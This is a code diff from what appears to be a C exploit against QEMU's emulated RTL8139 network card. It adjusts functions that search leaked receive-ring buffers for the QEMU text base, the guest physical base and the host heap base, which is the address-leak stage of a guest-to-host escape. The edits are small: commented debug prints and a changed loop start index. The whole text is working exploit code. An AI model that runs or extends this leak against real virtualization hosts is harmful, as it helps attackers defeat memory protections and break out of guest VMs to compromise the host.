@@ -240,6 +240,7 @@ uint64_t searchTextBase(void *ptr, size_t size)
 	}
 	if(flag){
 		//xxd(ptr, RTL8139_BUFFER_SIZE);
+		//printf("0x%llx\n", tmp_ret);
 		ans = tmp_ret - guess[tmp];
 		printf("Base address of qemu text: 0x%llx\n", ans);
 	}
@@ -285,6 +286,7 @@ uint64_t searchPhyBase(void *ptr, size_t size)
 	}
 	if(flag){
 		//xxd(ptr, RTL8139_BUFFER_SIZE);
+		//printf("0x%llx\n", value);
 		printf("Physical Base of Virtual Memory in Guest: 0x%llx\n", ans);
 		return ans;
 	}
@@ -345,13 +347,13 @@ uint64_t searchHeapBase(void *ptr, size_t size, uint64_t textBase)
 			    }
 			}
 		}
-		value = 0;
 		if(flag)
 			break;
 		
 	}
 	if(flag){
 		//xxd(ptr, RTL8139_BUFFER_SIZE);
+		//printf("0x%llx\n", value);
 		printf("Base Address of Heap Address: 0x%llx\n", ans);
 		return ans;
 	}
@@ -467,23 +469,22 @@ int main()
 	uint64_t heapBaseAddr = 0;
 	for (i = 0; i < rtl8139_rx_nb; i++)
 		xxd(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
-	for (i = 0; i < rtl8139_rx_nb; i++)
+	for (i = 4; i < rtl8139_rx_nb; i++)
 	{
 		textBaseAddr = searchTextBase(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
 		if(textBaseAddr != 0)
 			break;
 	}
-	for (i = 0; i < rtl8139_rx_nb; i++)
+	for (i = 4; i < rtl8139_rx_nb; i++)
 	{
 		phyBaseAddr = searchPhyBase(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
 		if(phyBaseAddr != 0)
 			break;
 	}
-	for (i = 0; i < rtl8139_rx_nb; i++)
+	for (i = 4; i < rtl8139_rx_nb; i++)
 	{
 		heapBaseAddr = searchHeapBase(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE, textBaseAddr);
 		if(heapBaseAddr != 0)
 			break;
 	}
 }
-
